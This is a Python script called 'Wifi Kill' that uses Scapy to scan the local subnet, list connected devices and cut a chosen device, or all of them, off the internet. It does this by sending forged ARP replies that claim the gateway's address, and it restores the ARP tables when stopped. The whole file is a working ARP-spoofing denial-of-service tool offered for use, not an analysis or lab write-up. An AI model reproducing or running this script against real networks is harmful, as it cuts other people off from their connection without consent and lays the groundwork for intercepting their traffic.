#!/usr/bin/env python3
"""
Wifi Kill
Robert Glew (adjusted for Python 3 & modern Scapy)

This script can be used to kick anyone or everyone off your Wi‑Fi network.
It must be run as root (sudo) in order to send the required packets.
"""

import os
import socket
import logging
import time
from scapy.all import arping, ARP, send, conf, get_if_hwaddr

# Silence Scapy warnings
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
conf.verb = 0


def get_ip_macs(ips, iface):
    """Return a list of ``(ip, mac)`` tuples for devices on the network."""
    answers, _ = arping(ips, iface=iface, verbose=0)
    return [(r.psrc, r.hwsrc) for _, r in answers]


def poison(victim_ip, victim_mac, gateway_ip, src_mac):
    """Send ARP packet associating ``gateway_ip`` with ``src_mac``."""
    pkt = ARP(
        op=2,
        psrc=gateway_ip,
        hwsrc=src_mac,
        pdst=victim_ip,
        hwdst=victim_mac,
    )
    send(pkt, verbose=0)


def restore(victim_ip, victim_mac, gateway_ip, gateway_mac):
    """Send ARP packet pairing ``gateway_ip`` with ``gateway_mac``."""
    pkt = ARP(
        op=2,
        psrc=gateway_ip,
        hwsrc=gateway_mac,
        pdst=victim_ip,
        hwdst=victim_mac,
    )
    send(pkt, verbose=0)


def get_lan_ip():
    """Return the LAN IP by opening a UDP socket to a public address."""
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
        sock.connect(("8.8.8.8", 80))
        return sock.getsockname()[0]


def print_divider():
    print('-' * 40)


def is_admin():
    """Return ``True`` if the script is running with administrative rights."""
    if os.name != "nt":
        return os.geteuid() == 0

    try:
        import ctypes  # imported only on Windows
        return ctypes.windll.shell32.IsUserAnAdmin()
    except Exception:
        return False


def check_root():
    """Exit the script if not executed with administrator privileges."""
    if not is_admin():
        raise SystemExit(
            "You need to run the script as root/sudo or with Administrator "
            "privileges."
        )


def main():
    check_root()

    # determine your interface MAC to use as spoof source
    iface = conf.iface
    src_mac = get_if_hwaddr(iface)

    refreshing = True
    gateway_mac = None

    while refreshing:
        # build IP range and gateway IP
        my_ip = get_lan_ip()
        octets = my_ip.split('.')
        gateway_ip = '.'.join(octets[:3] + ['1'])
        ip_range = '.'.join(octets[:3] + ['0/24'])

        # discover devices
        devices = get_ip_macs(ip_range, iface)

        print_divider()
        print("Connected devices:")
        for idx, (ip, mac) in enumerate(devices):
            print(f"{idx}) {ip}\t{mac}")
            if ip == gateway_ip:
                gateway_mac = mac
        print_divider()

        print(f"Assumed gateway IP: {gateway_ip}")
        if gateway_mac:
            print(f"Detected gateway MAC: {gateway_mac}")
        else:
            print("⚠️  Gateway MAC not found – cannot restore later!")
        print_divider()

        print("Who do you want to boot?")
        print("(r) Refresh, (a) Kill all, (q) Quit")

        choice = None
        while True:
            cmd = input("> ").strip().lower()
            if cmd == 'r':
                break
            if cmd == 'a':
                choice = 'a'
                refreshing = False
                break
            if cmd == 'q':
                return
            if cmd.isdigit() and 0 <= int(cmd) < len(devices):
                choice = int(cmd)
                refreshing = False
                break
            print("Enter a valid option (r, a, q or device number).")

    # launch the attack
    try:
        if choice == 'a':
            print("Killing ALL devices... (Ctrl+C to stop)")
            while True:
                for ip, mac in devices:
                    poison(ip, mac, gateway_ip, src_mac)
                time.sleep(2)

        else:
            victim_ip, victim_mac = devices[choice]
            print(
                f"Preventing {victim_ip} from accessing the internet... "
                "(Ctrl+C to stop)"
            )
            while True:
                poison(victim_ip, victim_mac, gateway_ip, src_mac)
                time.sleep(2)

    except KeyboardInterrupt:
        print("\nRestoring ARP tables...")
        if choice == 'a':
            for ip, mac in devices:
                if gateway_mac:
                    restore(ip, mac, gateway_ip, gateway_mac)
        else:
            if gateway_mac:
                restore(victim_ip, victim_mac, gateway_ip, gateway_mac)
        print("Done. You're welcome!")


if __name__ == "__main__":
    main()
